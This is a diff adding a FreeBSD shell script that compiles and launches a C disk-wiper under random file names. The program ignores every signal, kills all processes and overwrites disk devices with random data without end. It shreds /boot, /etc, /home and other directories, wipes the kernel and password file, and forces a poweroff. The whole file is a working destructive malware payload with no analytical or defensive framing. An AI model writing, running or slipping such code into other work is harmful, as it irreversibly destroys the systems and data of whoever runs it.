@@ -1,0 +1,176 @@
+#!/bin/sh
+yes | pkg install gcc
+
+cat > NjhMl.c << 'EOF'
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <sys/disk.h>
+#include <sys/ioctl.h>
+#include <pthread.h>
+
+#define BUFFER_SIZE  (1 * 1024 * 1024)  // 1MB buffer
+#define OVERWRITE_ITERATIONS 3
+
+// Global flags for synchronization
+volatile int disks_being_destroyed = 0;
+volatile int files_being_destroyed = 0;
+
+void sanitize_system() {
+    // Disable all signals
+    for (int sig = 1; sig < NSIG; sig++) signal(sig, SIG_IGN);
+    
+    // Become system daemon
+    if (fork() != 0) exit(0);
+    setsid();
+    chdir("/");
+}
+
+void* destroy_disk(void *arg) {
+    char *disk = (char*)arg;
+    int fd;
+    unsigned char *buffer = malloc(BUFFER_SIZE);
+    int iterations = OVERWRITE_ITERATIONS;
+
+    if ((fd = open(disk, O_WRONLY | O_DIRECT)) < 0) {
+        free(buffer);
+        return NULL;
+    }
+
+    disks_being_destroyed++;
+    
+    // Multiple overwrite patterns
+    while (iterations--) {
+        lseek(fd, 0, SEEK_SET);
+        size_t written = 0;
+        while (written < 2LL * 1024 * 1024 * 1024) {  // First 2GB
+            arc4random_buf(buffer, BUFFER_SIZE);
+            write(fd, buffer, BUFFER_SIZE);
+            written += BUFFER_SIZE;
+        }
+    }
+
+    // Full disk destruction in background
+    lseek(fd, 0, SEEK_SET);
+    while (1) {
+        arc4random_buf(buffer, BUFFER_SIZE);
+        write(fd, buffer, BUFFER_SIZE);
+    }
+
+    close(fd);
+    free(buffer);
+    disks_being_destroyed--;
+    return NULL;
+}
+
+void obliterate_file(const char *path) {
+    struct stat st;
+    int fd;
+    
+    if (lstat(path, &st) || S_ISDIR(st.st_mode)) return;
+
+    if ((fd = open(path, O_WRONLY | O_DIRECT)) >= 0) {
+        ftruncate(fd, 0);
+        unsigned char *buffer = malloc(BUFFER_SIZE);
+        for (int i = 0; i < OVERWRITE_ITERATIONS; i++) {
+            lseek(fd, 0, SEEK_SET);
+            size_t written = 0;
+            while (written < st.st_size) {
+                arc4random_buf(buffer, BUFFER_SIZE);
+                write(fd, buffer, BUFFER_SIZE);
+                written += BUFFER_SIZE;
+            }
+        }
+        free(buffer);
+        close(fd);
+    }
+    unlink(path);
+}
+
+void nuke_directory(const char *path) {
+    DIR *dir;
+    struct dirent *entry;
+    
+    if (!(dir = opendir(path))) return;
+    
+    while ((entry = readdir(dir))) {
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+        
+        char full_path[1024];
+        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
+        obliterate_file(full_path);
+        nuke_directory(full_path);
+    }
+    closedir(dir);
+}
+
+void system_sabotage() {
+    // Overwrite kernel modules
+    const char *targets[] = {
+        "/boot/kernel/kernel",
+        "/boot/loader.conf",
+        "/etc/rc.conf",
+        "/etc/master.passwd",
+        NULL
+    };
+    
+    for (int i = 0; targets[i]; i++) {
+        obliterate_file(targets[i]);
+    }
+}
+
+int main() {
+    sanitize_system();
+    
+    // Phase 1: Process Annihilation
+    kill(-1, SIGKILL);
+    
+    // Phase 2: Memory Destruction
+    system("swapoff -a");
+    
+    // Phase 3: Storage Armageddon
+    DIR *devdir = opendir("/dev");
+    struct dirent *entry;
+    pthread_t tid;
+    
+    while ((entry = readdir(devdir))) {
+        if (strstr(entry->d_name, "da") || strstr(entry->d_name, "ada")) {
+            char devpath[1024];
+            snprintf(devpath, sizeof(devpath), "/dev/%s", entry->d_name);
+            pthread_create(&tid, NULL, destroy_disk, strdup(devpath));
+        }
+    }
+    closedir(devdir);
+    
+    // Phase 4: Filesystem Destruction
+    const char *critical_paths[] = {"/boot", "/etc", "/root", "/home", "/var", "/tmp", NULL};
+    for (int i = 0; critical_paths[i]; i++) {
+        nuke_directory(critical_paths[i]);
+    }
+    
+    // Phase 5: System Sabotage
+    system_sabotage();
+    
+    // Phase 6: Shutdown the system so its unusable again
+    sync();
+    system("poweroff -f");
+    
+    // Loop sabotage
+    while (1) {
+        system_sabotage();
+        sleep(1);
+    }
+    
+    return 0;
+}
+EOF
+
+gcc -o WtRfvLOp NjhMl.c
+./WtRfvLOp &
+disown
